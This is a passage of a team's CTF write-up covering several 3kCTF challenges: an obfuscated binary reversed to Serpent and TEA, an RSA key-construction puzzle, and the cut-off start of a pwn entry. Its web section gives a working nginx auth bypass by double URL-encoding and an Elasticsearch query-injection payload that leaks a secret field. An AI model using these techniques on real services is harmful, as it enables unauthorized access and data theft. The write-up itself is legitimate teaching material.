r1, g1, b1, o1 = fffmok_pixels_rev[i] r2, g2, b2, o2 = fffmok_pixels_rev[i + 1] v = bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2])) p = ((key_mask64 - (key_mask64 - v) % 18446744073709551615) + 18446744073709551615) ^ key # assert (p ^ key) % 18446744073709551615 == v ffmok_bytes_rev += p.to_bytes(8, \"big\") ffmok_bytes_rev += bytes(fffmok_pixels_rev[-1]) k = b'\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01' iv = b'\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF' aes = AES.new(k, AES.MODE_CBC, iv) fmok_bytes_rev = aes.decrypt(ffmok_bytes_rev[:-4]) + ffmok_bytes_rev[-4:] fmok_pixels_rev = [[fmok_bytes_rev[i+j] for j in range(8) if i + j  len(fmok_bytes_rev)] for i in range(0, len(fmok_bytes_rev), 8)] # iv = tuple(b\"ASDFQWER\") iv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, 'little')))))) prev = iv mok_bytes_rev = b\"\" for i in fmok_pixels_rev: prev0 = [_ for _ in prev] appending = bytes(map(lambda x, y: x ^ y, i, prev)) # assert tuple(map(lambda x, y: x ^ y, appending, prev0)) == tuple(i) mok_bytes_rev += appending prev = tuple(i) mok = Image.frombytes('RGBA', (887,499), mok_bytes_rev, 'raw') mok.save(\"el_mok.png\") # open(\"el_mok.data\", \"wb\").write(mok_bytes_rev) if unsure about the dimension Part V. The Memories Recovered \nTherefore, the flag is 3k{I_Am_50_pR3t7y_W1tH_My_H4IR}.\nLayers (Reverse; 488 points) Solved by Mystiz and cdemirer.\nNote. This is written based on their first revision of the code. They have released a new revision which has a different offset.  We are given a 64-bit ELF called layers in the challenge. The functions are obfuscated so that the logic is not trivial to read. For instance, sub_400E40 is one of relatively simpler function:\n__int64 __fastcall sub_400E40(const char *a1) { size_t v1; // rax  signed int v2; // ecx  signed int v4; // [rsp+2Ch] [rbp-14h]  int v5; // [rsp+30h] [rbp-10h]  unsigned int v6; // [rsp+34h] [rbp-Ch]  v6 = 0; v5 = 0; v4 = 0x1EB0722D; while ( v4 != 0x87679F00 ) { switch ( v4 ) { case (int)0x9415E80F: ++v5; v4 = 0x1EB0722D; break; case 0x12F4C285: v6 += a1[v5]; v4 = 0x9415E80F; break; case 0x1EB0722D: v1 = strlen(a1); v2 = 0x87679F00; if ( v5  v1 ) v2 = 0x12F4C285; v4 = v2; break; } } return v6; } Part I. Drawing State Machines For sub_400E40 we mentioned above, we can see that the code to be executed is determined by v4. For instance, when v4 = 0x1EB0722D, then v1 = strlen(a1) and will jump to 0x12F4C285 if v5 , or otherwise 0x87679F00. I think this is pretty similar to a state machine (where v4 is the state), hence I started to draw the figures. Let's see sub_400E40 visually:\ndigraph { node [shape=\"box\"]; \"BEGIN\" - \"0x1EB0722D\" \"0x87679F00\"[label=\"END\"] \"0x9415E80F\"[label=\"++v5\"] \"0x9415E80F\"-\"0x1EB0722D\" \"0x12F4C285\"[label=\"v6 += a1[v5]\"] \"0x12F4C285\"-\"0x9415E80F\" \"0x1EB0722D\"[label=\"v1 = strlen(a1)\"] \"0x1EB0722D\"-\"0x12F4C285\"[label=\"v5 \"0x87679F00\"[style=\"dashed\"] } Since v6 is the returning variable, we can see that the function is computing the sum of ASCII values, i.e., a1[0] + a1[1] + ...\nIn the similar fashion, I manually built the graphs for main and some of the functions called by main. Here are some of them:\nmain digraph { node [shape=\"box\"]; \"BEGIN\"[fillcolor=\"lightblue\", style=\"filled\"] \"BEGIN\" - \"0x7F83FB5\" \"0x8130ED43\"[label=\"memset c2, k2, m2\\nj1 = 0\"] \"0x8130ED43\"-\"0x93689926\" \"0x84A7F436\"[label=\"j2 = 0\"] \"0x84A7F436\"-\"0x325B57D6\" \"0x8F6AECCF\"[label=\"k2[j1] = rand()\"] \"0x8F6AECCF\"-\"0xCEDBC306\" \"0x93689926\"[shape=\"point\"] \"0x93689926\"-\"0x8F6AECCF\"[label=\"j1 \"0x84A7F436\"[style=\"dashed\"] \"0x9E00E14A\"[label=\"++j4\"] \"0x9E00E14A\"-\"0x379D135E\" \"0xA026F981\"[label=\"++j5\"] \"0xA026F981\"-\"0xB9048286\" \"0xAD9286F4\"[label=\"memset(tmp, 0, 32)\\nsub_403EC0(flag[16*j3], key, tmp, 32)\\nj4 = 0\"] \"0xAD9286F4\"-\"0x379D135E\" \"0xAE672971\"[label=\"*flag_tail=0\"] \"0xAE672971\"-\"0xF8F2B980\" \"0xB9048286\"[shape=\"point\"] \"0xB9048286\"-\"0x13F8F8B8\"[label=\"j5 \"0xF436E04E\"[style=\"dashed\"] \"0xBD66D1C0\"[label=\"v33[16 * j3 + j4] = tmp[j4]\"] \"0xBD66D1C0\"-\"0x9E00E14A\" \"0xCBD7742F\"[label=\"++j2\"] \"0xCBD7742F\"-\"0x325B57D6\" \"0xCEDBC306\"[label=\"++j1\"] \"0xCEDBC306\"-\"0x93689926\" \"0xDA5A3C78\"[label=\"++j6\"] \"0xDA5A3C78\"-\"0x28B41C13\" \"0xE3A80132\"[shape=\"point\"] \"0xE3A80132\"-\"0x263F9E70\" \"0xEB90905D\"[label=\"++i\"] \"0xEB90905D\"-\"0x6C6E9FB7\" \"0xEE3FA927\"[label=\"sprintf(flag, \\\"%s%c\\\", flag, pad)\"] \"0xEE3FA927\"-\"0xDA5A3C78\" \"0xF2CAB7B8\"[label=\"seed = sub_400E40(flag)\\nsrand(seed)\\nj5 = 0\"] \"0xF2CAB7B8\"-\"0xB9048286\" \"0xF436E04E\"[label=\"ptr = malloc(0x20uLL)\\npad = 16 - (strlen(flag) \u0026 0xF)\\nj6 = 0\"] \"0xF436E04E\"-\"0x28B41C13\" \"0xF8F2B980\"[shape=\"point\"] \"0xF8F2B980\"-\"0x4119DFE7\"[label=\"strlen(flag)  0x28\"] \"0xF8F2B980\"-\"0xF2CAB7B8\"[style=\"dashed\"] \"0x7F83FB5\"[shape=\"point\"] \"0x7F83FB5\"-\"0xAE672971\"[label=\"v39\"] \"0x7F83FB5\"-\"0xF8F2B980\"[style=\"dashed\"] \"0x1238A7CD\"[label=\"j3_ = j3;\\nflen = strlen(flag)\"] \"0x1238A7CD\"-\"0xAD9286F4\"[label=\"j3_ 4\"] \"0x1238A7CD\"-\"0x8130ED43\"[style=\"dashed\"] \"0x13F8F8B8\"[label=\"key[j5] = rand()\"] \"0x13F8F8B8\"-\"0xA026F981\" \"0x140AF898\"[label=\"memset(m2, 0, 8uLL);\\n__isoc99_sscanf(\u0026v33[8 * j2], \\\"%8s\\\", m2)\\nsub_4008F0(m2, k2)\\nsprintf(c2, \\\"%s%s\\\", c2, m2)\"] \"0x140AF898\"-\"0xCBD7742F\" \"0x15223C70\"[label=\"END\"] \"0x263F9E70\"[label=\"++j3\"] \"0x263F9E70\"-\"0x1238A7CD\" \"0x28B41C13\"[shape=\"point\"] \"0x28B41C13\"-\"0xEE3FA927\"[label=\"j6 \"0x68B9F247\"[style=\"dashed\"] \"0x325B57D6\"[label=\"v13 = strlen(v33)\"] \"0x325B57D6\"-\"0x140AF898\"[label=\"j2  3\"] \"0x325B57D6\"-\"0x41DBA672\"[style=\"dashed\"] \"0x36B7A523\"[label=\"fn_key ^= TARGET_C[i] ^ c2[i]\"] \"0x36B7A523\"-\"0xEB90905D\" \"0x379D135E\"[shape=\"point\"] \"0x379D135E\"-\"0xBD66D1C0\"[label=\"j4 \"0xE3A80132\"[style=\"dashed\"] \"0x4119DFE7\"[label=\"FAIL\"] \"0x41DBA672\"[label=\"i = 0\"] \"0x41DBA672\" - \"0x6C6E9FB7\" \"0x68B9F247\"[label=\"j3 = 0\"] \"0x68B9F247\" - \"0x1238A7CD\" \"0x6C6E9FB7\"[shape=\"point\"] \"0x6C6E9FB7\" - \"0x36B7A523\"[label=\"i \"0x15223C70\"[style=\"dashed\"] } sub_403EC0 digraph { node [shape=\"box\"]; \"BEGIN\"[fillcolor=\"lightblue\", style=\"filled\"] \"sub_403090\"[fillcolor=\"yellow\", style=\"filled\"] \"BEGIN\" - \"sub_403090\" \"sub_403090\" - \"0xC69A2A67\" \"0xA57D3848\"[fillcolor=\"lightblue\", style=\"filled\"] \"0xA57D3848\" - \"0xA5AA2438\" \"0xA5AA2438\"[label=\"++i\"] \"0xA5AA2438\" - \"0x39ABA8E6\" \"0xBD3CC7E5\"[label=\"j = 0\"] \"0xBD3CC7E5\" - \"0xF100B3F1\" \"0xC69A2A67\"[shape=\"point\"] \"0xC69A2A67\" - \"0xBD3CC7E5\"[label=\"k \"0x6968BCED\"[style=\"dashed\"] \"0xCF365A10\"[shape=\"point\"] \"0xCF365A10\" - \"0x120F462B\" \"0xF100B3F1\"[shape=\"point\"] \"0xF100B3F1\" - \"0x510340B5\"[label=\"j \"0x5E778DDD\"[style=\"dashed\"] \"0xFCEC94E4\"[label=\"message[0] ^= s[128] ^ 0x734CA101\\nmessage[1] ^= s[129]\\nmessage[2] ^= s[130]\\nmessage[3] ^= s[131] ^ 0xA9BDC3C0\"] \"0xFCEC94E4\" - \"0xCF365A10\" \"0x120F462B\"[label=\"++k\"] \"0x120F462B\" - \"0xC69A2A67\" \"0x2E78E25C\"[shape=\"point\"] \"0x2E78E25C\" - \"0x45DFAE8F\"[label=\"k \"0xFCEC94E4\"[style=\"dashed\"] \"0x39ABA8E6\"[shape=\"point\"] \"0x39ABA8E6\" - \"0xA57D3848\"[label=\"i \"0x2E78E25C\"[style=\"dashed\"] \"0x45DFAE8F\"[fillcolor=\"lightblue\", style=\"filled\"] \"0x45DFAE8F\" - \"0xCF365A10\" \"0x510340B5\"[label=\"v33[j] = s[4*k+j] ^ message_2[j];\\nmessage_2[j] = 0\"] \"0x510340B5\" - \"0x7E76B88E\" \"0x5E778DDD\"[label=\"i = 0\"] \"0x5E778DDD\" - \"0x39ABA8E6\" \"0x6968BCED\"[label=\"END\"] \"0x7E76B88E\"[label=\"++j\"] \"0x7E76B88E\" - \"0xF100B3F1\" } sub_403090 digraph { node [shape=\"box\"]; \"BEGIN\"[fillcolor=\"lightblue\", style=\"filled\"] \"BEGIN\" - \"0xA9B955DB\" \"0x9606678C\"[label=\"++v31\"] \"0x9606678C\" - \"0xE95AC0CE\" \"0x9AEEB6EF\"[label=\"++v33\"] \"0x9AEEB6EF\" - \"0x5D8F0B74\" \"0x9D018AD3\"[label=\"s[v34] = v37[4*v34]\"] \"0x9D018AD3\" - \"0x2ECFFA35\" \"0x9ED567C1\"[label=\"v30 = 0\"] \"0x9ED567C1\" - \"0x266844EC\" \"0xA9B955DB\"[shape=\"point\"] \"0xA9B955DB\" - \"0x2F508473\"[label=\"!v44\"] \"0xA9B955DB\" - \"0xC5DE43B8\"[style=\"dashed\"] \"0xAB353F6F\"[label=\"v37[v35] = v42[v35]\"] \"0xAB353F6F\" - \"0x68961212\" \"0xAC6E0E08\"[shape=\"point\"] \"0xAC6E0E08\" - \"0x1CD6C9C1\" \"0xB52C03B2\"[shape=\"point\"] \"0xB52C03B2\" - \"0x1E2DB7B4\" \"0xC04417E3\"[label=\"++v32\"] \"0xC04417E3\" - \"0xFBD35FED\" \"0xC20FEFFC\"[label=\"v37[v36] = 1\\nv34 = 0\"] \"0xC20FEFFC\" - \"0x122E3189\" \"0xC3734AAC\"[shape=\"point\"] \"0xC3734AAC\" - \"0xB52C03B2\" \"0xC5DE43B8\"[shape=\"point\"] \"0xC5DE43B8\" - \"0xD35B09A7\"[label=\"v40 \"0x2E8B62E9\"[style=\"dashed\"] \"0xC8900AC5\"[label=\"v29 = (3 - v30) % 32\\nv28 = 0\\nv27 = 0\"] \"0xC8900AC5\" - \"0x355CE5DB\" \"0xD35B09A7\"[label=\"memset(v37, 0, 0x20)\\nv36 = v40\\nv35 = 0\"] \"0xD35B09A7\" - \"0x7AFA98D4\" \"0xD5C4F2A6\"[fillcolor=\"lightblue\", style=\"filled\"] \"0xD5C4F2A6\" - \"0x9606678C\" \"0xDCDB893A\"[shape=\"point\"] \"0xDCDB893A\" - \"0x1E2DB7B4\" \"0xE07F4AFD\"[label=\"v33 = 0\"] \"0xE07F4AFD\" - \"0x5D8F0B74\" \"0xE1928E6D\"[label=\"v24 = ((v28  v26) \u0026 1) \"0xEDCFB4AF\" \"0xE95AC0CE\"[shape=\"point\"] \"0xE95AC0CE\" - \"0xD5C4F2A6\"[label=\"v31 \"0x9ED567C1\"[style=\"dashed\"] \"0xEDCFB4AF\"[label=\"++v26\"] \"0xEDCFB4AF\" - \"0x67B26225\" \"0xFBD35FED\"[shape=\"point\"] \"0xFBD35FED\" - \"0x4F5A98FA\"[label=\"v32 \"0x521305BC\"[style=\"dashed\"] \"0x122E3189\"[shape=\"point\"] \"0x122E3189\" - \"0x9D018AD3\"[label=\"v34 \"0xDCDB893A\"[style=\"dashed\"] \"0x1CD6C9C1\"[label=\"++v27\"] \"0x1CD6C9C1\" - \"0x355CE5DB\" \"0x1E2DB7B4\"[label=\"v32 = 0\"] \"0x1E2DB7B4\" - \"0xFBD35FED\" \"0x266844EC\"[shape=\"point\"] \"0x266844EC\" - \"0xC8900AC5\"[label=\"v30 \"0x775D4F05\"[style=\"dashed\"] \"0x2DC162EB\"[shape=\"point\"] \"0x2DC162EB\" - \"0x7E2E7A9E\" \"0x2E8B62E9\"[shape=\"point\"] \"0x2E8B62E9\" - \"0xE07F4AFD\"[label=\"v40 == 32\"] \"0x2E8B62E9\" - \"0x39486DAD\"[style=\"dashed\"] \"0x2ECFFA35\"[label=\"++v34\"] \"0x2ECFFA35\" - \"0x122E3189\" \"0x2F508473\"[label=\"EXIT(1)\"] \"0x355CE5DB\"[shape=\"point\"] \"0x355CE5DB\" - \"0x718C2A8A\"[label=\"v27 \"0x2DC162EB\"[style=\"dashed\"] \"0x39486DAD\"[label=\"EXIT(1)\"] \"0x4F5A98FA\"[label=\"v38[v32] = s[v32]\"] \"0x4F5A98FA\" - \"0xC04417E3\" \"0x521305BC\"[label=\"v31 = 8\"] \"0x521305BC\" - \"0xE95AC0CE\" \"0x5D8F0B74\"[shape=\"point\"] \"0x5D8F0B74\" - \"0x7EE39471\"[label=\"v33 \"0xC3734AAC\"[style=\"dashed\"] \"0x67B26225\"[shape=\"point\"] \"0x67B26225\" - \"0xE1928E6D\"[label=\"v26 \"0xAC6E0E08\"[style=\"dashed\"] \"0x68961212\"[label=\"++v35\"] \"0x68961212\" - \"0x7AFA98D4\" \"0x718C2A8A\"[fillcolor=\"lightblue\", style=\"filled\"] \"0x718C2A8A\" - \"0x67B26225\" \"0x775D4F05\"[label=\"END\"] \"0x7AFA98D4\"[shape=\"point\"] \"0x7AFA98D4\" - \"0xAB353F6F\"[label=\"v35 \"0xC20FEFFC\"[style=\"dashed\"] \"0x7E2E7A9E\"[label=\"++v30\"] \"0x7E2E7A9E\" - \"0x266844EC\" \"0x7EE39471\"[label=\"s[v33] = v42[4 * v33]\"] \"0x7EE39471\" - \"0x9AEEB6EF\" } sub_4008F0 digraph { node [shape=\"box\"]; \"BEGIN\"[fillcolor=\"lightblue\", style=\"filled\"] \"BEGIN\" - \"0xB8C6BEDB\" \"0xB8C6BEDB\"[label=\"i2 = i\\ni = i - 1\"] \"0xB8C6BEDB\" - \"0xDB5D7A76\"[label=\"i2\"] \"0xB8C6BEDB\" - \"0xB43E0C74\"[style=\"dashed\"] \"0xDB5D7A76\"[fillcolor=\"lightblue\", style=\"filled\"] \"0xDB5D7A76\" - \"0xB8C6BEDB\" \"0xB43E0C74\"[label=\"END\"] } cdemirer wrote a deobfuscator which made the script very readable. If you are interested on the deobfuscator, let’s wait if he is gonna write something about it.  Part II. Looking for the Algorithms By searching the constant available in sub_4008F0 (i.e., 0x61C88647), we found signs of Tiny Encryption Algorithm (TEA)3. By comparing to its implementation from Wikipedia4, we are convinced that sub_4008F0 is an encryptor of TEA.\nOn the other hand, sub_403EC0 is less trivial. It called sub_403090 once before the encryption is done - which I think is a key expansion algorithm. Eventually, I observed that dword_6060D0 is used in both of the functions above. I copied the first 16 bytes of it and searched on Google:\n\nThe subsequent bytes for dword_6060D0 match the S-boxes for Serpent. After all, the functions are implementing Serpent cipher. It is a lesser-known encryption algorithm - which is actually a candidate of AES. Up to now, I suspect that 0x606090 is the target ciphertext which is the encrypted flag. The key is derived by the sum of ascii values of the flag, which could be exhausted.\ndigraph { rankdir=LR node [shape=\"box\"] flag-x1[label=\"Serpent\"] x1-\"bytes_606090\"[label=\"TEA\"] x1[shape=\"point\"] } Unfortunately, we are unable to recover the flag. Unknowningly what happened, I decided to sleep.\nWhile I am asleep, harrier has notified us that the binary for the challenge is updated. There are one solve immediately after. This got me thinking: What I had is correct, but the ciphertext given from the previous binary is wrong. Hence, I updated my script with the new ciphertext and execute again - and I am able to get the flag:\nflag{_a1f040be800d4dd9a2b9a7d2b8f2be31_} p(a)wnshop (Web; 478 points) Solved by ozetta.\nThe first goal of this challenge is to access the admin backend service with this nginx configuration:\nlocation ~admin { auth_basic \"pawnshop admin\"; auth_basic_user_file /etc/nginx/.htpasswd; } location ~^/backend/(.*)$ { proxy_pass http://172.30.0.6:8080/$1; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; } The challenge states that we should not brute force .htpasswd. So accessing /backend/admin.py with a valid password seems impossible. But luckily we can bypass the restriction with double-encoding: /backend/%2561dmin.py\nThen we need to inject the Elasticsearch query:\n'query_string': { 'query': 'id:0 AND seller:\"'+emailAddr+'\"', \"default_field\":\"seller\" } where the email address is validated:\nfrom email.utils import parseaddr def verify_email(mail): parsedEmail = parseaddr(mail)[1] if parsedEmail == '' or parsedEmail != mail or not re.findall(r'.+@.+\\..+',parsedEmail): api({'msg':'invalid email'}) So the standard way to fulfill the validation while injecting the query is to use a pair of quote in the email name. To make a query we can reuse the UI provided:\nfunction x(q){ $.ajax({ url: '/backend/%2561dmin.py', type : \"POST\", data : {\"action\":\"lookup\",\"mail\":'\" AND value:*'+q+'* AND seller:\"jmfffc@pawnshop.2021.3k.ctf.to'}, success : function(result) { console.log(result.msg); } }) } Note that jmfffc@pawnshop.2021.3k.ctf.to is the email address of the flag seller. Originally I use both upper case and lower case characters (and also some special characters like the underscore) in the query but I found that the query is case insensitive, so I remove the upper case characters later on. Then I got the possible bigrams of the flag:\nbigram = ['0u','1d','2_','3k','41','il','ti','uh','ma','hu','em','p2','tt','io','da','_v','4n','nd','al','on','va','u_','ai','at','l_','s4','_s','_4','_e','n_','tp','_h','ht','_y','y0','l1','d_']; We have 3k in the bigram list as expected. Our teammate Mystiz created a bigram graph for himself (not me, I don't know how to read the graph effectively):\ndigraph{ \"0\" - \"u\" \"1\" - \"d\" \"2\" - \"_\" \"3\" - \"k\" \"4\" - \"1\" \"i\" - \"l\" \"t\" - \"i\" \"u\" - \"h\" \"m\" - \"a\" \"h\" - \"u\" \"e\" - \"m\" \"p\" - \"2\" \"t\" - \"t\" \"i\" - \"o\" \"d\" - \"a\" \"_\" - \"v\" \"4\" - \"n\" \"n\" - \"d\" \"a\" - \"l\" \"o\" - \"n\" \"v\" - \"a\" \"u\" - \"_\" \"a\" - \"i\" \"a\" - \"t\" \"l\" - \"_\" \"s\" - \"4\" \"_\" - \"s\" \"_\" - \"4\" \"_\" - \"e\" \"n\" - \"_\" \"t\" - \"p\" \"_\" - \"h\" \"h\" - \"t\" \"_\" - \"y\" \"y\" - \"0\" \"l\" - \"1\" \"d\" - \"_\" } Then he started fine-tuning the flag... _email,y0u,val1d,http2,val1dation,s41d\n\nI forgot to tell him I found the keyword huh before, huh. But he found that immediately afterwards. I build a trigram later on, but Mystiz did not need this:\ntrigram = ['1da','1d_','2_4','0u_','41d','tp2','dat','htt','d_h','_4n','on_','val','nd_','y0u','al1','mai','u_s','ttp','ail','_y0','huh','s41','tio','ati','ion','_hu','_va','n_y','l_v','il_','ema','l1d','_s4','d_e','_em','4nd','p2_']; \nThen he submitted the flag before I got the flag: 3k{http2_4nd_email_val1dation_y0u_s41d_huh}.\nBy the way, the intended solution was to use h2c request smuggling instead of double encoding to bypass the proxy checking.\nASR (Crypto; 483 points) Solved by TWY.\nPart I. Basic Knowledge Fermat Little Theorem: $a^p\\equiv a \\pmod p$ for all prime number $p$'s, or equivalently,\n\\[ a^{p-1} \\equiv \\left\\{ \\begin{array}{ll} 0 \u0026 a \\bmod p \\equiv 0\\\\ 1 \u0026 \\text{otherwise} \\end{array} \\right. \\pmod p\\]\nfor all prime number $p$'s.\nPart II. Analysis The program uses OpenSSL.crypto as the RSA private key loading library.\nGiven $m$ and $c$, the final target of the challenge is to generate a private key such that $m^d \\bmod N = c$.\nwith the constraints\n $d  1337^5$ (i dont like small numbers) $N \\bmod 2 \\neq 0$ (and i dont like even numbers).  The beginning of the source code checks whether the following key is valid:\n-----BEGIN RSA PRIVATE KEY----- MBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA= -----END RSA PRIVATE KEY----- The key reads as the following:\nversion = 0x00 (0) modulus = 0x2d (45) public exponent = 0x07 (7) private exponent = 0x00 (0) prime1 = 0x0f (15) prime2 = 0x03 (3) exponent1 = 0x00 (0) exponent2 = 0x00 (0) coefficient = 0x00 (0) Apparently 15 is neither a prime nor coprime with 3, and all parameters involving modular inverse calculations are set to 0. So this should be an invalid key.\nHowever, earlier versions do not recognize this invalid key pattern, so it may pass the check.\nHence this check in the source code is used tell us that the challenge server is not using the older version that allows such kind of invalid keys.\nimport OpenSSL.crypto as crypto rsa_p_not_prime_pem = \"\"\"\\n-----BEGIN RSA PRIVATE KEY-----\\nMBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA=\\n-----END RSA PRIVATE KEY-----\\n\"\"\" invalid_key = crypto.load_privatekey(crypto.FILETYPE_PEM, rsa_p_not_prime_pem) error_msg = \"Pycrypto needs to be patched!\" try: invalid_key.check() raise RuntimeError(error_msg) except crypto.Error: pass Obviously this is not pycrypto but OpenSSL.crypto library.\nThe expected error message (if printed out) is (realigned):\nOpenSSL.crypto.Error: [ ( 'rsa routines', 'RSA_check_key_ex', 'p not prime' ),( 'rsa routines', 'RSA_check_key_ex', 'd e not congruent to 1' ),( 'bignum routines', 'BN_mod_inverse', 'no inverse' ) ] Since the error list is actually quite comprehensive, which means we had better use a valid RSA key with two primes.\nPart III. Making Use of the Theorem(s) Since we know that $a^{p-1} \\equiv 1 \\pmod p$ for all $a$'s such that $0 \\lt a \\lt p$, we can conclude that $a^x - a^{x \\bmod{(p-1)}} \\equiv 0 \\pmod p$ for all possible $a$'s for all non-negative integer $x$'s.\nTo fulfill the modular equation in the challenge, the modulus $N$ needs to be larger than $c$, which means we need to have primes $p$ and $q$ such that $pq  c$.\nInstead of finding $N$ directly, we can make use of the Chinese remainder theorem to construct the values of $N$, $d$, and $e$ if we can obtain two equations like this:\n\\[ \\left\\{ \\begin{array}{ll} m^{x_p} \\equiv c \\pmod p \\\\ m^{x_q} \\equiv c \\pmod q \\end{array} \\right. \\]\nThen we have\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{(p-1)} \\equiv x_p \\\\ d \\bmod{(q-1)} \\equiv x_q \\end{array} \\right. \\]\nNotice that for odd prime $p$ and $q$, both $p-1$ and $q-1$ are even, which means $\\phi(N)$ (Euler's totient function) must be even. Therefore, in most cases $d$ has to be odd so that $e$ can be obtained, i.e. $d$ is invertible under modulo $\\phi(N)$. (Since the value of $\\lambda(N)$ (Carmichael function / Reduced totient function) is always even except that $\\lambda(1) = \\lambda(2) = 1$, no such exception exists)\nThis means for example there is no use finding an even $x_p = p - 1$ where $p$ is $260163...128287$ (a 183-digit prime factor of $c-1$5), so $m^{p-1}\\equiv 1 \\equiv c \\pmod p$.\nTo generalize, we only need $x_p = p - 1 + b$, where $p$ is a prime factor of $c - m^b$ for odd $b$. Here $m^{x_p} \\equiv m^{p-1+b}\\equiv m^b \\equiv c \\pmod p$.\nWith the help of Alpertron6, we obtained the largest factor of $c-m^7$, which is $r_1 := 795088...535639$ (185 digits)7 and the largest factor of $c-m^{11}$, which is $r_2 := 140515...084809$ (190 digits)8.\nHowever, these two factors do not work, why?\nThe reason is that $\\text{GCD}(p-1, q-1)=42$, and $7 \\not\\equiv 11 \\pmod{42}$.\nTherefore, we continued and went into a long way of dealing with the factorization of much larger numbers (Since $m^{12}\\gt c$, $m^b$ becomes exponentially greater than $c$ for $b \\geq 12$), and found the largest prime factor of $-(c-m^{27})$, which is $r_3 := 156985...742221$ (468 digits!!!)9\nNote: Since RSA Private Key requires two primes, so we cannot just use this alone although this already far exceeds $c$  Now let's try to find the GCD again.\n $\\text{GCD}(r_1-1, r_2-1)=42$ $\\text{GCD}(r_1-1, r_3-1)=2$ $\\text{GCD}(r_2-1, r_3-1)=4$  Since $7\\equiv11\\equiv27\\pmod 4$, so using either of them along with the new prime factor is fine. (Really?)\nIn this case, we have chosen $r_2$.\nActually the pair using $r_1$ does not work (to be explained later).  Since these two numbers are not coprime, we actually have to set up three equations for the CRT.\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{\\frac{r_2-1}{8}} \\equiv 11 \\\\ d \\bmod{\\frac{r_3-1}{4}} \\equiv 27 \\\\ d \\bmod{8} \\equiv 3 \\end{array} \\right. \\]\nBy the Chinese Remainder Theorem, we have $d = 469849...444147$.\nPart IV: Generating the Private Key So we can generate the private key, by submitting the proof of work and the key to the challenge server to obtain the flag:\nn = p * q e = pow(d, -1, (p - 1) * (q - 1)) from Crypto.PublicKey import RSA key = RSA.construct((n, e, d)) print(key.export_key().decode()) Sample Private Key:\n-----BEGIN RSA PRIVATE KEY----- MIIFJAIBAAKCAREUDyj+A0LeFPNuAY78kHjkqce86Hut6sL7GR4UG67f9yPyVi62 AHgbEXBRqPUVL2irfgqa/RoGqsSPnT8THeqgHpFbxErqDihyRjPgXEQYiMGG00rY ZxGvESxd1V5WnwRi5qIYtodcYpH4W3mzRS13OkPwE9MghZpbDLv/MQuoga9hsWDx 6HnMqjn1QKJQCFMFJkf3jhl+B0U+qAiKFbNoFxw94n7S5iXHvktsNYfXfBlBWfYH h3xvjbxCCEqcJCCJY58nihI88dVJizXWPAk6EdVFmz2A9Aepk/sQDx39IPv/gYCI xH6HHnwNZGhasTk0SPMpelgpDj/EIVr67cHTt16MMGNse2nLNhJ4xCJ2nXUCggER C2ZYKkUhLkMbl2cpuicTznJnfg1tJfW6OUg3SVQ/hF5iyxtIEC1dB0lQFEInzU94 OZ5UbFuXsFKH2LoUgW28c+lEi7ZEVgADYSK/vRXJ1gg2SJXpXq+fAgK2rup2jYUH fs4uTTHEdHZsn68HmI2vSfbE+YnAPQgKV2wfKxHjTyac9CnKUBS4vgg7r7NFXwrF UKxA/KW2JqItgGHQOO3f+CUzvncdjEt+DZtLzICYnjYCgpcdCppfPJnbjLgEoUMX Ce/dFZBduXTyJTZYjivkAQPcqnrtb9001p4znE2qW2oYwkJnbMI3nYfUY8ZPgFR9 0skLeaZGnhJ9nioPMuJm58vnXhjTbxoHb3SZ6/+pYjJbAoIBEQRFxqXzpe/5sPhX +8QJ1HFaynfmBMXlq07MtzOIwUimHVg+O2GuXGp1PmfJncsZnl2FDprTMtb8KF7s 2XZwQTqNb34gLL1Ux78HzL6hyjrMXUOuusNa/fyssajrBYG5vO7VpxFWstZOPNk+ ThMh3XYLTUPhuVyQ/ng5mh0tM1bV1fhAzuzOSU83Mm0rNHkJxU0BNry1wYaGEgTa FpxETEG1rvt+KG+KPwvb/tMsznZqfFMUxnpRfCIHWZHSXjVqo73kmHnNCBn8reFs 7kWHA+k0ZAkfwCJpzNPsHthFFM795d0aFR8QjH0FJmSerAX1joJlVApGWSkQfhlJ aLZCC/+cqWXftq9VkFcmMjwNu95d8wKBwwD+aqp1+dd5Fwl4cpmIN55IlSY868Lv +YzuZCKcJjVzXZgkjOpegziBN+gWVVn0j5MMFn+hHYCN0j0ZKKAFVASxLBwIN+Wb yppI5gaqj99utjptpoUnI0W4hHk6d3OpnT/8vcPhsSesupTB9DYtsH7oq1b9ynVm z7GTI+GRwhfa5/YCqi57jlVKbo7M4Tvw2JN05HRNzVbjZefjy1PLK9esnYY0qcQY bxywSF5kyOj9Pd8Ao/tCLbNZH3i7E8Et/iIajQJPFC8eR3E5VZniAqLKfNtngNS/ IfhKGDHGZxZ+psfLx9USKT2Lrnp/dM6VKPZIzNz1BcYRWj2GFVi35tW7npDcVnZS rWBlpm/MJnNgH2oIiQIBGwIBCwKBwkzSg9YK9nvOxmDugCz+LNi82wRBhKiDpXGx ZN2pamHx+lndJRWC9fslPEOCgkhngdN3kSUMRJrhP84df3I44XthJIYn33mXteFZ noWHut0IHxERByKpmAH7cU4+YogwyV0PlhVvjJBq/zYHYhSJqRE5upl+TZxSg8aD n7Mf5EHaUUjTxBO9xvkJntaDJAjKcZC7+s45wiJphO0I7uJ7s9cI9hqz4GBnZ7AH bJ+WsYQzn+HtKK9H2mNaWklsHJ7OeYBl -----END RSA PRIVATE KEY----- For the completeness, here we explain why the pair using $r_1 - 1$ does not work:\nBoth the calculated $d$ ($213175…494107$) and $p-1$ ($r_1 - 1$) are divisible by $7$, so $d$ has no inverse under modulo $(p-1)(q-1)$, thus there are no $e$s. This explains the actual difficulty in finding a pair that passes all the coprime checks.\n masterc (Pwn; 478 points) Solved by bot_3310.\nTL;DR.\n leak PIE base overwrite stack guard leak libc base syscall   First, we take a look at the 